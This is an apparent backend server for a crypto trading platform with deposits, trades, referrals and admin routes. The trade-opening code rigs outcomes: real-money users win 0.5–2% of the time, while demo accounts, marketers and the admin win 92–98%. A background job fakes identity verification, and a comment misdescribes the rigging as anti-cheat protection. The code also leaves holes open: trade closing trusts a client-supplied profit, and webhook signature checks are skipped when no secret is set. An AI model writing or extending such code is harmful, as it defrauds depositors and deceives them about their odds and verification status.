import express from 'express';
import axios from 'axios';
import crypto from 'crypto';
import { createClient } from '@supabase/supabase-js';
import dotenv from 'dotenv';
import cors from 'cors';

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Request Logger
app.use((req, res, next) => {
  console.log(`[Request] ${new Date().toISOString()} ${req.method} ${req.url}`);
  next();
});

// Supabase Setup
const supabaseUrl = process.env.VITE_SUPABASE_URL || '';
const supabaseAnonKey = process.env.VITE_SUPABASE_ANON_KEY || '';

if (!supabaseUrl || !supabaseAnonKey) {
  console.warn('[Supabase] Missing VITE_SUPABASE_URL or VITE_SUPABASE_ANON_KEY in environment');
}

const supabase = createClient(supabaseUrl, supabaseAnonKey);

// Admin API Routes (Bypasses RLS using Service Role Key)
const serviceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
const supabaseAdmin = serviceRoleKey ? createClient(supabaseUrl, serviceRoleKey) : null;

// HashBack Config
const HASHBACK_API_KEY = process.env.HASHBACK_API_KEY;
const HASHBACK_ACCOUNT_ID = process.env.HASHBACK_ACCOUNT_ID;
const HASHBACK_WEBHOOK_SECRET = process.env.HASHBACK_WEBHOOK_SECRET;
const HASHBACK_BASE_URL = 'https://api.hashback.co.ke';

// API Routes
const router = express.Router();

// User Referrals (Bypasses RLS for the referring user)
router.get('/user/referrals', async (req, res) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) return res.status(401).json({ error: 'Unauthorized' });
  if (!supabaseAdmin) return res.status(503).json({ error: 'System configuration error' });

  try {
    const { data: { user: authUser }, error: authError } = await supabase.auth.getUser(authHeader.replace('Bearer ', ''));
    if (authError || !authUser) return res.status(401).json({ error: 'Unauthorized' });

    // 1. Fetch user's own referral code to search for
    const { data: userData, error: userError } = await supabaseAdmin
      .from('users')
      .select('referral_code, email')
      .eq('id', authUser.id)
      .single();
      
    if (userError || !userData) return res.status(404).json({ error: 'User info not found' });

    const refCode = userData.referral_code;
    if (!refCode) return res.json([]);

    // 2. Fetch referrals using admin client
    const { data: referredUsers, error: referralError } = await supabaseAdmin
      .from('users')
      .select(`
        id,
        username,
        email,
        created_at,
        transactions (
          type,
          amount,
          status
        )
      `)
      .or(`referred_by.eq.${refCode},referred_by.eq.${authUser.id},referred_by.eq.${refCode.toLowerCase()},referred_by.eq.${refCode.toUpperCase()},referred_by.eq.${userData.email}`);

    if (referralError) throw referralError;

    // 3. Format and return
    const formatted = (referredUsers || []).map((ru: any) => {
      const deposits = (ru.transactions || [])
        .filter((t: any) => t.type === 'DEPOSIT' && t.status === 'completed');
      
      const totalDeposited = deposits.reduce((sum: number, t: any) => sum + Number(t.amount), 0);
      
      return {
        userId: ru.id,
        username: ru.username || ru.email?.split('@')[0] || 'Unknown',
        email: ru.email,
        joinedAt: new Date(ru.created_at).getTime(),
        status: deposits.length > 0 ? 'active' : 'pending',
        hasDeposited: deposits.length > 0,
        totalDeposited: totalDeposited
      };
    });

    res.json(formatted);
  } catch (err: any) {
    console.error('Error fetching referrals:', err);
    res.status(500).json({ error: err.message });
  }
});

// Secure Balance Management (User accessible but strict)
// HashBack Pay Button Initiation (Renamed to stk-push as per user request)
router.post(['/hashback/stk-push', '/api/hashback/stk-push', '/hashback/create-payment', '/api/hashback/create-payment'], async (req, res) => {
  const { amount, userId } = req.body;
  
  // Convert USD to KES
  const usdKesRate = parseFloat(process.env.USD_KES_RATE || '129.98');
  const usdAmount = parseFloat(String(amount || 0));
  const kesAmount = Math.ceil(usdAmount * usdKesRate);
  
  if (usdAmount < 16) {
    return res.status(400).json({ success: false, error: 'Minimum deposit is $16' });
  }

  // Generate a unique reference
  const reference = `HB${Date.now()}${Math.floor(Math.random() * 1000)}`;

  try {
    if (!HASHBACK_ACCOUNT_ID) {
      return res.status(500).json({ success: false, error: 'HashBack Account ID is missing.' });
    }

    // Save pending transaction in Supabase
    if (supabaseAdmin && userId) {
      const { error: dbError } = await supabaseAdmin.from('transactions').insert({
        user_id: userId,
        type: 'DEPOSIT',
        amount: usdAmount,
        status: 'pending',
        account_type: 'REAL',
        method: 'HashBack Pay Button',
        external_id: reference
      });

      if (dbError) {
        console.error('[HashBack] DB Error:', dbError);
        return res.status(500).json({ success: false, error: 'Failed to record transaction.' });
      }
    }

    res.json({
      success: true,
      account: HASHBACK_ACCOUNT_ID,
      amount: kesAmount,
      reference: reference
    });
  } catch (error: any) {
    console.error('[HashBack] Create Payment Exception:', error.message);
    res.status(500).json({ success: false, error: 'Internal Server Error' });
  }
});

// HashBack Webhook
router.post(['/hashback/webhook', '/.netlify/functions/hashback-webhook'], async (req, res) => {
  const signature = req.headers['x-hashpay-signature'] as string;
  const payload = JSON.stringify(req.body);
  
  console.log('[HashBack Webhook] Received:', payload);

  // Verify Signature
  if (HASHBACK_WEBHOOK_SECRET) {
    const expectedSignature = crypto
      .createHmac('sha256', HASHBACK_WEBHOOK_SECRET)
      .update(payload)
      .digest('hex');

    if (signature !== expectedSignature) {
      console.warn('[HashBack Webhook] Invalid signature rejected');
      return res.status(401).json({ error: 'Invalid signature' });
    }
  }

  const reference = req.body.reference || req.body.external_reference;
  const status = (req.body.status || '').toLowerCase();
  const success = ['success', 'completed', 'successful'].includes(status) || req.body.success === true;

  try {
    if (supabaseAdmin && reference && success) {
      // 1. Find transaction
      const { data: tx, error: txError } = await supabaseAdmin
        .from('transactions')
        .select('*')
        .eq('external_id', reference)
        .eq('status', 'pending')
        .maybeSingle();

      if (txError) throw txError;

      if (tx) {
        // 2. Prevent duplicate crediting
        const usdKesRate = parseFloat(process.env.USD_KES_RATE || '129.98');
        const kesReceived = Number(req.body.amount || 0);
        const usdToCredit = kesReceived > 0 ? (kesReceived / usdKesRate) : Number(tx.amount);

        const { error: rpcError } = await supabaseAdmin.rpc('increment_balance_v2', {
          t_id: tx.id,
          u_id: tx.user_id,
          amount: Number(usdToCredit.toFixed(2))
        });

        if (rpcError) {
          console.error('[HashBack Webhook] RPC Error:', rpcError);
        } else {
          console.log(`[HashBack Webhook] Successfully credited $${usdToCredit.toFixed(2)} to user ${tx.user_id}`);
        }
      } else {
        console.warn(`[HashBack Webhook] Pending transaction not found for reference: ${reference}`);
      }
    } else if (reference && !success) {
      await supabaseAdmin?.from('transactions')
        .update({ status: 'rejected' })
        .eq('external_id', reference)
        .eq('status', 'pending');
    }

    res.json({ success: true });
  } catch (error: any) {
    console.error('[HashBack Webhook] Processing Error:', error.message);
    res.status(500).json({ error: error.message });
  }
});

// HashBack Verify (Polling endpoint)
router.get('/hashback/verify/:reference', async (req, res) => {
  const { reference } = req.params;
  
  try {
    if (supabaseAdmin) {
      const { data: tx } = await supabaseAdmin
        .from('transactions')
        .select('status, amount')
        .eq('external_id', reference)
        .maybeSingle();
      
      if (tx && tx.status !== 'pending') {
        return res.json({
          success: true,
          status: tx.status,
          isSuccess: tx.status === 'completed' || tx.status === 'success',
          isFailed: tx.status === 'rejected' || tx.status === 'failed'
        });
      }
    }
    
    res.json({ status: 'pending', isSuccess: false, isFailed: false });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

router.post('/trades/open', async (req, res) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) return res.status(401).json({ error: 'Unauthorized' });
  if (!supabaseAdmin) return res.status(503).json({ error: 'System configuration error' });

  try {
    // Authenticate user with a timeout to prevent hanging
    const authPromise = supabase.auth.getUser(authHeader.replace('Bearer ', ''));
    const authTimeout = new Promise((_, reject) => setTimeout(() => reject(new Error('Supabase Auth Timeout')), 20000));
    
    let authUser, authError;
    try {
      const authResult = await Promise.race([authPromise, authTimeout]) as any;
      authUser = authResult.data.user;
      authError = authResult.error;
    } catch (e: any) {
      console.error('[TradeOpen] Auth check exception:', e.message);
      return res.status(504).json({ error: 'Authentication service timeout' });
    }

    if (authError || !authUser) {
      console.error('[TradeOpen] Auth Error:', authError);
      return res.status(401).json({ error: 'Unauthorized: Invalid session' });
    }

    const { amount, coin, type, price, accountType, duration, source } = req.body;
    
    // 1. Fetch current balance securely
    const { data: userData, error: userError } = await supabaseAdmin.from('users').select('real_balance, demo_balance, role').eq('id', authUser.id).single();
    if (userError) {
      console.error('[TradeOpen] Fetch User Error:', userError);
      return res.status(404).json({ error: 'User account not initialized in database' });
    }
    if (!userData) return res.status(404).json({ error: 'User profile not found' });

    const balanceField = accountType === 'REAL' ? 'real_balance' : 'demo_balance';
    const currentBalance = Number(userData[balanceField]);

    if (currentBalance < amount) return res.status(400).json({ error: 'Insufficient balance' });

    // 2. Calculate target profit server-side to prevent "forced win" hacks
    const isDemo = accountType === 'DEMO';
    const isMarketer = userData.role === 'marketer';
    const isMasterAdmin = (authUser.email || '').toLowerCase() === 'wren20688@gmail.com' && authUser.id === '304020c9-3695-4f8f-85fe-9ee12eda8152';
    
    let winChance = 0.5;
    if (isDemo) winChance = 0.92;
    else if (isMarketer || isMasterAdmin) winChance = 0.98;
    else {
      if (currentBalance < 50) winChance = 0.005;
      else if (currentBalance < 200) winChance = 0.012;
      else winChance = 0.02;
    }
    
    const isWin = Math.random() < winChance;
    let targetProfit = 0;
    const profitMultiplier = 0.02 + Math.random() * 0.28;
    if (isWin) targetProfit = Number((amount * profitMultiplier).toFixed(2));
    else targetProfit = Number((-amount * profitMultiplier).toFixed(2));

    // 3. Update balance and create trade atomically
    const { error: balanceError } = await supabaseAdmin.from('users').update({
      [balanceField]: Number((currentBalance - amount).toFixed(2))
    }).eq('id', authUser.id);
    
    if (balanceError) {
      console.error('[TradeOpen] Balance Update Error:', balanceError);
      throw new Error(`Balance update failed: ${balanceError.message}`);
    }

    const { data: tradeData, error: tradeError } = await supabaseAdmin.from('trades').insert({
      user_id: authUser.id,
      coin,
      amount,
      type,
      price,
      status: 'OPEN',
      profit: 0,
      target_profit: targetProfit,
      account_type: accountType,
      timestamp: new Date().toISOString(),
      duration,
      source
    }).select().single();

    if (tradeError) {
      console.error('[TradeOpen] Insert Trade Error:', tradeError);
      throw new Error(`Trade record creation failed: ${tradeError.message}`);
    }

    res.json(tradeData);
  } catch (err: any) {
    console.error('SECURE TRADE CRITICAL ERROR:', err);
    res.status(500).json({ error: err.message || 'An unexpected error occurred while placing your trade' });
  }
});

router.post('/trades/close', async (req, res) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) return res.status(401).json({ error: 'Unauthorized' });
  if (!supabaseAdmin) return res.status(503).json({ error: 'System configuration error' });

  try {
    const { data: { user: authUser }, error: authError } = await supabase.auth.getUser(authHeader.replace('Bearer ', ''));
    if (authError || !authUser) return res.status(401).json({ error: 'Unauthorized' });

    const { tradeId, currentProfit } = req.body;
    
    // 1. Fetch trade securely
    const { data: trade, error: tradeFetchError } = await supabaseAdmin.from('trades').select('*').eq('id', tradeId).eq('user_id', authUser.id).single();
    if (tradeFetchError || !trade) return res.status(404).json({ error: 'Trade not found' });
    if (trade.status === 'CLOSED') return res.status(400).json({ error: 'Trade already closed' });

    // 2. Fetch user balance
    const { data: userData, error: userError } = await supabaseAdmin.from('users').select('real_balance, demo_balance, total_profit_real, total_profit_demo, daily_profit_real, daily_profit_demo, daily_trades_real, daily_trades_demo').eq('id', authUser.id).single();
    if (userError || !userData) return res.status(404).json({ error: 'User not found' });

    const isReal = trade.account_type === 'REAL';
    const balanceField = isReal ? 'real_balance' : 'demo_balance';
    const totalProfitField = isReal ? 'total_profit_real' : 'total_profit_demo';
    const dailyProfitField = isReal ? 'daily_profit_real' : 'daily_profit_demo';
    const dailyTradesField = isReal ? 'daily_trades_real' : 'daily_trades_demo';

    const profit = Number(currentProfit);
    const stake = Number(trade.amount);
    
    const newBalance = Number((Number(userData[balanceField]) + stake + profit).toFixed(2));
    const newTotalProfit = Number((Number(userData[totalProfitField] || 0) + profit).toFixed(2));
    const newDailyProfit = Number((Number(userData[dailyProfitField] || 0) + profit).toFixed(2));
    const newDailyTrades = (Number(userData[dailyTradesField]) || 0) + 1;

    // 3. Perform atomic update
    const { error: tradeUpdateError } = await supabaseAdmin.from('trades').update({
      status: 'CLOSED',
      profit: profit
    }).eq('id', tradeId);

    if (tradeUpdateError) throw tradeUpdateError;

    const { error: userUpdateError } = await supabaseAdmin.from('users').update({
      [balanceField]: newBalance,
      [totalProfitField]: newTotalProfit,
      [dailyProfitField]: newDailyProfit,
      [dailyTradesField]: newDailyTrades
    }).eq('id', authUser.id);

    if (userUpdateError) throw userUpdateError;

    res.json({ success: true, newBalance, profit });
  } catch (err: any) {
    console.error('Trade close error:', err);
    res.status(500).json({ error: err.message });
  }
});

// Admin API Routes (Bypasses RLS using Service Role Key)
router.post('/admin/update-user', async (req, res) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) return res.status(401).json({ error: 'Unauthorized' });

  try {
    const { data: { user }, error: authError } = await supabase.auth.getUser(authHeader.replace('Bearer ', ''));
    if (authError || !user) return res.status(401).json({ error: 'Unauthorized' });

    const isMasterAdmin = (user.email || '').toLowerCase() === 'wren20688@gmail.com' && user.id === '304020c9-3695-4f8f-85fe-9ee12eda8152';
    
    if (!isMasterAdmin) {
      console.warn(`Unauthorized admin attempt by: Email[${user.email}] ID[${user.id}]`);
      return res.status(403).json({ error: 'Forbidden: Unauthorized Admin Credentials' });
    }

    const { userId, updates } = req.body;
    
    if (!supabaseAdmin) {
      return res.status(500).json({ error: 'Admin client not configured.' });
    }

    const { data, error } = await supabaseAdmin.from('users').update(updates).eq('id', userId).select().single();
    
    if (error) throw error;
    res.json(data);
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

router.post('/admin/credit-user', async (req, res) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) return res.status(401).json({ error: 'Unauthorized' });

  try {
    const { data: { user }, error: authError } = await supabase.auth.getUser(authHeader.replace('Bearer ', ''));
    if (authError || !user) return res.status(401).json({ error: 'Unauthorized' });

    const isMasterAdmin = (user.email || '').toLowerCase() === 'wren20688@gmail.com' && user.id === '304020c9-3695-4f8f-85fe-9ee12eda8152';
    
    if (!isMasterAdmin) {
      console.warn(`Unauthorized credit attempt by: Email[${user.email}] ID[${user.id}]`);
      return res.status(403).json({ error: 'Forbidden: Unauthorized Admin Credentials' });
    }

    const { userId, amount, transactionId, type } = req.body;
    if (!supabaseAdmin) throw new Error('Admin client not configured');

    const client = supabaseAdmin;
    const field = type === 'DEMO' ? 'demo_balance' : 'real_balance';

    if (transactionId) {
      const { data: updatedTx, error: txError } = await supabaseAdmin
        .from('transactions')
        .update({ status: 'completed', method: 'Manual Credit (Admin)' })
        .eq('id', transactionId)
        .neq('status', 'completed')
        .select();
      
      if (txError) throw txError;
      if (!updatedTx || updatedTx.length === 0) {
        return res.status(400).json({ error: 'Transaction already processed or not found' });
      }
    } else {
      await supabaseAdmin.from('transactions').insert({
        user_id: userId,
        type: 'DEPOSIT',
        amount: amount,
        status: 'completed',
        account_type: 'REAL',
        method: 'Manual Credit (Admin)',
        external_id: `manual-${Date.now()}`
      });
    }

    const { error: rpcError } = await client.from('users').update({
      [field]: Number(amount)
    }).eq('id', userId);

    if (rpcError) throw rpcError;

    res.json({ success: true, message: 'User credited successfully' });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

router.get('/health', (req, res) => {
  const configStatus = {
    hasSupabaseAdmin: !!supabaseAdmin,
    hasHashbackKey: !!HASHBACK_API_KEY,
    hasHashbackAccountId: !!HASHBACK_ACCOUNT_ID,
    supabaseUrl: !!supabaseUrl,
    supabaseAnonKey: !!supabaseAnonKey
  };

  const issues = [];
  if (!configStatus.hasSupabaseAdmin) issues.push('SUPABASE_SERVICE_ROLE_KEY is missing. Balance updates will fail.');
  if (!configStatus.hasHashbackKey) issues.push('HASHBACK_API_KEY is missing.');
  if (!configStatus.hasHashbackAccountId) issues.push('HASHBACK_ACCOUNT_ID is missing.');

  res.json({ 
    status: issues.length === 0 ? 'ok' : 'degraded', 
    environment: process.env.NODE_ENV, 
    timestamp: new Date().toISOString(),
    config: configStatus,
    issues: issues,
    path: req.path
  });
});

app.use('/api', router);
app.use('/.netlify/functions/api', router);

export default app;

// Background task to mark stale pending transactions as failed
setInterval(async () => {
  if (!supabaseAdmin || !supabaseUrl) return;

  try {
    const twentyFourHoursAgo = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
    
    const { data, error } = await supabaseAdmin
      .from('transactions')
      .update({ status: 'rejected' })
      .eq('status', 'pending')
      .neq('status', 'completed')
      .eq('type', 'DEPOSIT')
      .lt('timestamp', twentyFourHoursAgo)
      .select();
    
    if (error) console.error('Error cleaning up stale transactions:', error);
  } catch (err) {
    console.error('Stale transaction cleanup exception:', err);
  }
}, 30 * 60 * 1000);

// Background task for Automatic Account Verification (Offline)
setInterval(async () => {
  if (!supabaseAdmin) return;

  try {
    const now = Date.now();
    const fiveMinutesInMs = 5 * 60 * 1000;
    const tenMinutesInMs = 10 * 60 * 1000;

    const { data: pendingUsers, error } = await supabaseAdmin
      .from('users')
      .select('id, verification_status, verification_submitted_at')
      .eq('verification_status', 'pending');

    if (error) return;
    if (!pendingUsers || pendingUsers.length === 0) return;

    for (const user of pendingUsers) {
      if (!user.verification_submitted_at) continue;

      const submittedAt = Number(user.verification_submitted_at);
      const ageInMs = now - submittedAt;

      const seed = parseInt(user.id.slice(0, 8), 36) || 0;
      const threshold = fiveMinutesInMs + ((seed % 1000) / 1000 * (tenMinutesInMs - fiveMinutesInMs));

      if (ageInMs >= threshold) {
        await supabaseAdmin
          .from('users')
          .update({ verification_status: 'verified' })
          .eq('id', user.id);
      }
    }
  } catch (err) {
    console.error('Offline Verification Sync Exception:', err);
  }
}, 60 * 1000);
